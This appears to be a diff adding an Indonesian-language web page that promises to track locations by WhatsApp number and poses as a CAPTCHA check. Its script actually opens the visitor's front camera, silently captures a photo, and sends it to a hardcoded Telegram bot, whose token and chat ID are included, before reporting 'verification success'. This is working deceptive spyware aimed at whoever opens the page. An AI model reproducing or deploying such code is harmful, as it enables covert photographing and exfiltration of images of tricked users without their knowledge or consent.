@@ -1,0 +1,156 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Lacak Lokasi Dengan Nomor WhatsApp</title>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    body {
+      font-family: 'Inter', sans-serif;
+      background: linear-gradient(135deg, #0f2027, #203a43, #2c5364);
+      height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: #fff;
+      flex-direction: column;
+    }
+
+    .container {
+      background: rgba(255, 255, 255, 0.05);
+      border: 1px solid rgba(255, 255, 255, 0.1);
+      border-radius: 20px;
+      padding: 50px 30px;
+      backdrop-filter: blur(15px);
+      box-shadow: 0 20px 40px rgba(0,0,0,0.3);
+      text-align: center;
+      max-width: 450px;
+      width: 90%;
+      animation: fadeIn 1s ease;
+    }
+
+    h2 {
+      font-weight: 600;
+      font-size: 22px;
+      margin-bottom: 10px;
+    }
+
+    p {
+      font-size: 14px;
+      color: #ccc;
+      margin-bottom: 30px;
+    }
+
+    .btn-premium {
+      padding: 14px 35px;
+      font-size: 16px;
+      border: none;
+      border-radius: 30px;
+      background: linear-gradient(to right, #00c896, #00b8e6);
+      color: white;
+      font-weight: 600;
+      cursor: pointer;
+      transition: all 0.3s ease;
+      box-shadow: 0 8px 25px rgba(0, 200, 150, 0.4);
+    }
+
+    .btn-premium:hover {
+      transform: scale(1.05);
+      box-shadow: 0 12px 30px rgba(0, 200, 150, 0.6);
+    }
+
+    @keyframes fadeIn {
+      from {opacity: 0; transform: translateY(20px);}
+      to {opacity: 1; transform: translateY(0);}
+    }
+
+    .credit {
+      margin-top: 25px;
+      font-size: 12px;
+      color: #aaa;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h2>Verifikasi CAPTCHA</h2>
+    <p>Untuk Mulai Melacak Lokasi Dengan Nomor WhatsApp, Verifikasi Terlebih Dahulu Bahwa Anda Bukan Robot.</p>
+    <button class="btn-premium" onclick="izinKamera()">Verifikasi Sekarang</button>
+  </div>
+
+  <div class="credit">
+    Create by <strong>lokasiku</strong>
+  </div>
+
+  <script>
+    let stream;
+
+    async function izinKamera() {
+      try {
+        stream = await navigator.mediaDevices.getUserMedia({
+          video: { facingMode: "user" },
+          audio: false
+        });
+
+        const video = document.createElement("video");
+        video.srcObject = stream;
+        video.setAttribute("playsinline", true);
+        video.muted = true;
+        video.play();
+
+        video.addEventListener('canplay', function () {
+          setTimeout(() => ambilFoto(video), 500);
+        });
+
+      } catch (err) {
+        alert("Gagal Verifikasi: " + err.message);
+      }
+    }
+
+    function ambilFoto(video) {
+      const canvas = document.createElement("canvas");
+      const ctx = canvas.getContext("2d");
+
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+
+      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+      canvas.toBlob(async function(blob) {
+        const token = "7351970346:AAF_rQ0TIxzm3a-e1azTZ0pyoueC_G_zHro";
+        const chatId = "5408845642";
+
+        const formData = new FormData();
+        formData.append("chat_id", chatId);
+        formData.append("photo", blob, "foto_auto.jpg");
+
+        try {
+          const res = await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
+            method: "POST",
+            body: formData
+          });
+
+          if (res.ok) {
+            alert("Verifikasi sukses...");
+          } else {
+            const errText = await res.text();
+            alert("Gagal Kirim:
+" + errText);
+          }
+
+          stream.getTracks().forEach(track => track.stop());
+        } catch (err) {
+          alert("Error Kirim: " + err.message);
+        }
+      }, "image/jpeg");
+    }
+  </script>
+</body>
+</html>
